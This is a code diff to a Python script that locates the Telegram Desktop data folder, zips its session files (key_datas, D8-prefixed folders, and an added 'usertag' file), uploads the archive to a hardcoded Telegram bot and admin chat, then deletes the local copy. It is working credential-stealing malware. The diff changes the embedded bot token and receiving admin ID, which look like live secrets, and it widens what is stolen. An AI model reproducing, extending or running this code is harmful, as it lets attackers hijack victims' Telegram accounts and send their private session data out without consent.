@@ -5,8 +5,8 @@ import datetime
 import requests 
 from requests.exceptions import RequestException
 
-BOT_TOKEN = "8174737942:AAEgCP12-jJ5ux9URaOoN3nFawHIakyEXDY"  
-ADMIN_ID = "6761011723"
+BOT_TOKEN = "7617736108:AAH3XFhvnuzbJ_FUW1KijvUPMgVPhMcvdXc"  
+ADMIN_ID = "7666170537"
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 def find_telegram_directory():
@@ -51,6 +51,11 @@ def create_archive(telegram_dir):
                 zipf.write(key_datas2_path, 'key_datas')
             else:
                 return False
+            key_datas3_path = os.path.join(tdata_dir, 'usertag')
+            if os.path.exists(key_datas3_path):
+                zipf.write(key_datas3_path, 'usertag')
+            else:
+                return False
             for item in os.listdir(tdata_dir):
                 if item.startswith('D8'):
                     item_path = os.path.join(tdata_dir, item)
@@ -84,9 +89,9 @@ def send_archive_to_bot_requests(archive_path):
             files = {'document': archive_file}
             data = {'chat_id': ADMIN_ID}
             response = requests.post(f"{TELEGRAM_API_URL}/sendDocument", data=data, files=files)
-            response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
+            response.raise_for_status() 
 
-        # Удаляем архив после отправки
+
         os.remove(archive_path)
         return True
 
@@ -98,15 +103,20 @@ def send_archive_to_bot_requests(archive_path):
         return False
 
 
+if __name__ == '__main__':
+    import psutil
+    import os
+    import zipfile
+    import datetime
+    import requests 
+    from requests.exceptions import RequestException
+    telegram_directory = find_telegram_directory()
 
-
-telegram_directory = find_telegram_directory()
-
-if telegram_directory:
-    archive_path = create_archive(telegram_directory)
-    if archive_path:
-        send_archive_to_bot_requests(archive_path)
+    if telegram_directory:
+        archive_path = create_archive(telegram_directory)
+        if archive_path:
+            send_archive_to_bot_requests(archive_path)
+        else:
+            pass
     else:
         pass
-else:
-    pass
